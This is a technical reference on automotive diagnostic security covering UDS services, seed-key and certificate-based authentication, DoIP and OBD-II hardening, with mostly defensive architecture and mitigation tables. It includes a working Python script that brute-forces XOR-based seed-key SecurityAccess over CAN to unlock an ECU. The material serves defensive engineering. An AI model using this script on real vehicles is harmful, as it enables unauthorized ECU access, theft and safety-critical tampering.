# Secure Diagnostics — UDS, OBD-II, DoIP

## Diagnostic Protocol Stack

```
┌───────────────────────────────────────────────────────────────┐
│ Application:  UDS (ISO 14229)                                  │
│               Unified Diagnostic Services                      │
├───────────────────────────────────────────────────────────────┤
│ Session:      DiagCom (ISO 14229-2)                           │
│               Request/Response, Session management             │
├───────────────────────────────────────────────────────────────┤
│ Transport:    DoIP (ISO 13400) — Diagnostics over IP          │
│               or ISO-TP (ISO 15765-2) — Transport over CAN    │
├───────────────────────────────────────────────────────────────┤
│ Network:      CAN 2.0 / CAN FD / Automotive Ethernet          │
├───────────────────────────────────────────────────────────────┤
│ Physical:     OBD-II connector (J1962) / DoIP port (13400)    │
└───────────────────────────────────────────────────────────────┘
```

## UDS Services (ISO 14229)

### Security-Relevant Services

| SID | Service | Security Impact |
|-----|---------|----------------|
| 0x10 | DiagnosticSessionControl | Session escalation (default→extended→programming) |
| 0x11 | ECUReset | Force reboot, disrupt operation |
| 0x22 | ReadDataByIdentifier | Information leakage (keys, configs, calibration) |
| 0x23 | ReadMemoryByAddress | Arbitrary memory read (firmware extraction) |
| 0x27 | SecurityAccess | Authentication gate (seed-key challenge-response) |
| 0x28 | CommunicationControl | Suppress/enable CAN messages (blind other ECUs) |
| 0x29 | Authentication | ISO 14229:2020 — PKI-based auth (replaces 0x27) |
| 0x2E | WriteDataByIdentifier | Modify ECU parameters/calibration |
| 0x2F | InputOutputControlByIdentifier | Actuator control (doors, brakes!) |
| 0x31 | RoutineControl | Execute routines (erase memory, self-test) |
| 0x34 | RequestDownload | Initiate firmware download |
| 0x36 | TransferData | Send firmware data chunks |
| 0x37 | RequestTransferExit | Complete download, verify |
| 0x3D | WriteMemoryByAddress | Arbitrary memory write |
| 0x3E | TesterPresent | Keep session alive |
| 0x85 | ControlDTCSetting | Disable fault recording (hide tampering) |

### UDS Session Levels
```
Session 0x01: Default Session
  → Limited services (ReadDID, TesterPresent)
  → No write access, no programming

Session 0x02: Programming Session
  → Firmware flash, memory access
  → Requires SecurityAccess (0x27) first!
  → ECU may disable safety-critical functions

Session 0x03: Extended Diagnostic Session
  → Full diagnostic access
  → Actuator control, routine execution
  → Requires SecurityAccess for dangerous services
```

## Security Access (0x27) — Legacy Authentication

### Seed-Key Challenge-Response
```
Client                           ECU
  │                               │
  │── DiagSessionControl(0x03) ──→│  Enter extended session
  │←── Positive Response ─────────│
  │                               │
  │── SecurityAccess(0x01) ──────→│  Request Seed (odd subfunction)
  │←── Seed (random challenge) ───│  ECU generates random seed
  │                               │
  │── SecurityAccess(0x02) ──────→│  Send Key (even subfunction)
  │    Key = f(Seed, Secret)      │  Key = algorithm(seed, shared_secret)
  │←── Positive Response ─────────│  If key matches → unlocked!
  │                               │
  │   [Secured services now available]
```

### Common Seed-Key Vulnerabilities

| Vulnerability | Description | Exploitation |
|--------------|-------------|--------------|
| Constant seed | Same seed every time | Record once, replay forever |
| Zero seed | Seed = 0x0000 → Key = 0x0000 | Trivial bypass |
| Weak algorithm | XOR/ADD with constant | Reverse from single pair |
| No attempt limit | Unlimited brute force | Try all keys (2^16 or 2^32) |
| Algorithm in client SW | Extracted from dealer tool | Reverse engineer .dll/.exe |
| Same secret across fleet | One compromise = all vehicles | Extract once, reuse globally |
| Seed reuse | Same seed after reset | Replay stored key |
| Time-based seed | Predictable (RTC value) | Set clock, predict seed |

### Seed-Key Attack Example
```python
import can
import struct

def crack_seed_key_xor(bus, arb_id_tx, arb_id_rx):
    """
    Example: Brute force XOR-based seed-key with 2-byte key.
    Many cheap ECUs use: key = seed XOR constant
    """
    # Enter extended session
    bus.send(can.Message(arbitration_id=arb_id_tx,
                         data=[0x02, 0x10, 0x03, 0,0,0,0,0]))

    # Request seed
    bus.send(can.Message(arbitration_id=arb_id_tx,
                         data=[0x02, 0x27, 0x01, 0,0,0,0,0]))

    msg = bus.recv(timeout=2.0)
    if msg and msg.data[1] == 0x67:  # Positive response
        seed = struct.unpack('>H', msg.data[2:4])[0]
        print(f"[*] Seed received: 0x{seed:04X}")

        # Try common XOR constants
        common_keys = [0xCAFE, 0xDEAD, 0x1234, 0xABCD, 0xFFFF]
        for const in common_keys:
            key = seed ^ const
            bus.send(can.Message(arbitration_id=arb_id_tx,
                                 data=[0x04, 0x27, 0x02,
                                       (key>>8)&0xFF, key&0xFF, 0,0,0]))
            resp = bus.recv(timeout=1.0)
            if resp and resp.data[1] == 0x67:
                print(f"[+] SUCCESS! Constant: 0x{const:04X}, Key: 0x{key:04X}")
                return key
            elif resp and resp.data[2] == 0x36:  # exceededNumberOfAttempts
                print("[-] Locked out! Wait or reset ECU")
                return None
    return None
```

## Authentication Service (0x29) — Modern PKI-Based

### ISO 14229:2020 Authentication (replacing 0x27)

```
Client (Tester)                    ECU
  │                                 │
  │── Authentication(DeAuthenticate)│  Clear previous auth state
  │←── Positive Response ───────────│
  │                                 │
  │── Authentication(verifyCertificateUnidirectional) ──→│
  │    [Tester Certificate]         │  Send client cert for validation
  │←── Challenge ───────────────────│  ECU validates cert chain
  │                                 │  ECU sends challenge (nonce)
  │── Authentication(proofOfOwnership) ──→│
  │    [Signature over challenge]   │  Sign challenge with private key
  │←── Positive Response ───────────│  ECU verifies signature → authenticated!
  │                                 │
  │   [Role-based access per cert attributes]
```

### Certificate-Based Access Control
```
Certificate attributes define permissions:
  - Role: OEM_Engineer / Dealer_Technician / Production / EOL_Tester
  - Scope: ReadOnly / Calibration / Programming / FullAccess
  - Validity: Time-limited (e.g., 8-hour work shift)
  - Vehicle scope: VIN-specific or fleet-wide

Example role mapping:
  OEM_Engineer  → All services, all ECUs
  Dealer_Tech   → Extended session, routine control, DTC management
  Production    → Programming session, EOL calibration
  Owner_App     → Read sensor data, basic settings only
```

### Advantages over Seed-Key (0x27)
| Feature | 0x27 (Seed-Key) | 0x29 (Authentication) |
|---------|------------------|-----------------------|
| Cryptography | Often weak XOR/AES | PKI (ECDSA/EdDSA) |
| Key distribution | Shared secrets | Certificates (revocable) |
| Granularity | Binary (locked/unlocked) | Role-based access |
| Revocation | Impossible without reflash | Certificate revocation |
| Auditability | None | Certificate serial logged |
| Time limitation | None | Certificate validity period |
| Per-user identity | No (shared password) | Yes (individual certs) |

## DoIP (Diagnostics over IP) — ISO 13400

### Protocol Details
```
Port: 13400 (TCP/UDP)
Discovery: UDP broadcast (Vehicle Identification Request)
Session: TCP connection with routing activation

DoIP Header:
┌──────────────┬──────────────┬──────────────┬──────────────────┐
│ Protocol Ver │ Inv. Version │ Payload Type │ Payload Length    │
│   (1 byte)   │   (1 byte)   │  (2 bytes)   │   (4 bytes)      │
└──────────────┴──────────────┴──────────────┴──────────────────┘
│ Payload (UDS message, routing activation, etc.)               │
└───────────────────────────────────────────────────────────────┘
```

### DoIP Security Concerns

| Attack | Description | Mitigation |
|--------|-------------|------------|
| Network scanning | Discover DoIP entities via UDP broadcast | Disable discovery on external interfaces |
| Unauthorized routing | Connect and activate diagnostic routing | TLS mutual auth, IP allowlisting |
| DoS on port 13400 | Flood TCP connections | Rate limiting, connection limit per source |
| MitM on diagnostic session | Intercept UDS traffic over IP | TLS 1.3 mandatory |
| Lateral movement | Pivot from IVI to DoIP gateway | Network segmentation, firewall rules |
| Remote flashing | Program ECU via cloud-connected DoIP | VPN + mutual TLS + 0x29 authentication |

### DoIP Security Best Practices
```
1. TLS 1.3 mandatory for all DoIP connections
2. Client certificate authentication (tester identity)
3. Disable UDP discovery on non-service-port interfaces
4. Maximum concurrent connection limit (typically 1-2)
5. Session timeout (auto-disconnect after inactivity)
6. Audit log all routing activations and diagnostic messages
7. Firewall: only allow DoIP from specific VLAN/IP range
8. Disable DoIP entirely when vehicle is in motion
```

## OBD-II Security

### OBD-II Port Risks
```
Physical access to OBD-II port provides:
├── Full CAN bus access (all vehicle buses via gateway)
├── Diagnostic services (UDS) to all ECUs
├── Potential programming access (firmware flash)
├── Aftermarket device installation point
└── Regulatory mandated (cannot be removed/disabled)

Aftermarket device risks:
├── OBD dongles (insurance, fleet tracking) → remote attack surface
├── Performance tuners → modify safety parameters
├── Third-party apps (Torque, FORscan) → uncontrolled access
└── Stolen OBD tools → vehicle theft enablement
```

### OBD-II Hardening
```
1. Gateway filtering:
   - Allow only Mode $01-$0A (emissions-related) without auth
   - Require SecurityAccess for programming/actuator control
   - Block safety-critical ECU access from OBD port

2. Physical protection:
   - OBD port relocation (harder to access)
   - OBD port lock (physical key required)
   - Tamper detection (alert on unexpected device connection)

3. Authentication:
   - Service 0x29 for privileged access
   - Time-limited session certificates for dealers
   - Disable programming while vehicle is in motion

4. Monitoring:
   - Log all OBD access attempts
   - Alert on programming session attempts
   - Detect brute force on SecurityAccess
```

## Secure Diagnostic Architecture

```
┌──────────────────────────────────────────────────────────────┐
│                SECURE DIAGNOSTIC SYSTEM                        │
├──────────────────────────────────────────────────────────────┤
│                                                               │
│  External Tester                                             │
│  ┌────────────────┐                                          │
│  │ Dealer Tool    │─── Certificate ─── Validity checked      │
│  │ (e.g., ODIS)  │    (X.509)         by ECU                │
│  └───────┬────────┘                                          │
│          │ TLS 1.3 + Client Cert                            │
│          ▼                                                   │
│  ┌────────────────┐                                          │
│  │ Diagnostic     │  Firewall rules:                         │
│  │ Gateway (DoIP) │  • Only port 13400                       │
│  │                │  • Max 1 concurrent session              │
│  │                │  • IP allowlist (service VLAN only)      │
│  └───────┬────────┘                                          │
│          │ Internal (SecOC-authenticated commands)            │
│          ▼                                                   │
│  ┌────────────────┐                                          │
│  │ Target ECU     │  Access control:                         │
│  │                │  • Check certificate role                │
│  │ Service 0x29   │  • Map role → allowed services           │
│  │ (Authentication)│ • Log all access with cert serial       │
│  │                │  • Rate limit SecurityAccess attempts    │
│  │                │  • Anti-rollback on firmware             │
│  └────────────────┘                                          │
│                                                               │
└──────────────────────────────────────────────────────────────┘
```

## Diagnostic Protocol Attacks — Summary

| Attack | Vector | Impact | Mitigation |
|--------|--------|--------|------------|
| Seed-key bypass | Reverse algorithm from tool | Full ECU access | Migrate to 0x29, use AES-based |
| CAN injection via OBD | Physical port access | Spoof messages | Gateway filtering, SecOC |
| DoIP remote exploit | Network (if exposed) | Remote ECU control | TLS + cert auth + segmentation |
| Diagnostic session hijack | CAN replay | Take over active session | Session nonce, timeout |
| Firmware extraction | ReadMemoryByAddress | IP theft, reverse engineering | Encrypt flash, protect read |
| Calibration tampering | WriteDataByIdentifier | Emissions defeat, safety | Signed calibration data |
| DTC suppression | ControlDTCSetting | Hide tamper evidence | Log to tamper-resistant store |
| Actuator abuse | IOControl (brakes, steering) | Safety hazard | Motion lockout, role-based |
